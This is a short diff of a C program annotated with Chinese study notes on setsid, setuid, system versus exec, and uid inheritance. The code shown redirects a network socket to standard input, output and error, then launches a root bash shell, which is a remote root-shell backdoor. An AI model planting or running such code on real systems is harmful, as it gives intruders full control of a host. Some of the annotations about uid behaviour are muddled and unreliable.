@@ -50,12 +50,15 @@ int main()
         dup2(connfd,STDIN_FILENO);
         dup2(connfd,STDOUT_FILENO);
         dup2(connfd,STDERR_FILENO);
-        setsid();    
+        setsid(); //只在子进程中有效，用于脱离终端控制daemon   
         setuid(0);
         //只有eid为root的程序可以更改uid为任意值
         system("/bin/bash");
-        //bash需要uid为0才能获取root权限
-        //fork得到的子进程只继承父进程的ruid
+        //system,会自动创建一个子进程，子进程结束后会回到父进程
+        //而exec直接用目标程序替换掉本进程,所以用system while循环有效，而用exec，在shell退出时，程序直接关闭
+        //--wrong,"sudo -s"--:system("bin/bash -s")//这条命令不需要setuid(0)，因为父进程的suid为0，拥有最高权限
+        //bash需要uid为0才能获取root权限，而sh不需要
+        //fork(exec)得到的子进程的所有uid只继承父进程的ruid APUE-p256
         //execlp("/bin/bash","/bin/bash",NULL);
         close(connfd);
     }
